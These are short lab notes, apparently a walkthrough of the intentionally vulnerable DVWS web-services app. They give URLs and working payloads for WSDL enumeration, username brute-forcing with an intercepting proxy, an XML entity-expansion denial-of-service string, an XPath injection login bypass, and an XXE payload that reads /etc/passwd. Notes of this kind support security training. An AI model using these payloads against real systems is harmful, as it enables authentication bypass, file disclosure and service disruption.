### WSDL Enumeration
URL: dvws/vulnerabilities/wsdlenum/service.php?wsdl

check_user_id with value root

### WSDL Scanning 
* Load the check_user_information envelope into Intruder
* select username space 
* add username lists to payload


### XML External Entity Injection
URL : /dvws/vulnerabilities/xxe/

[XML Entity Expansion]

```
<!DOCTYPE foo [<!ENTITY xee1 "hacking web apps is fun "><!ENTITY xee2 "&xee1;&xee1;"><!ENTITY xee3 "&xee2;&xee2;"><!ENTITY xee4 "&xee3;&xee3;">]><name>&xee4;</name>
```

### XPATH Injection
URL: /dvws/vulnerabilities/xpath/xpath.php 
* username: foo' or 1=1 or 'a'='a 
* password: bar


### XXE 2
payload

``` 
<!DOCTYPE foo [<!ENTITY xxe2q1pa SYSTEM "file:///etc/passwd"> ]><uservalue>
<value>DVWS&xxe2q1pa;</value>
</uservalue>
```
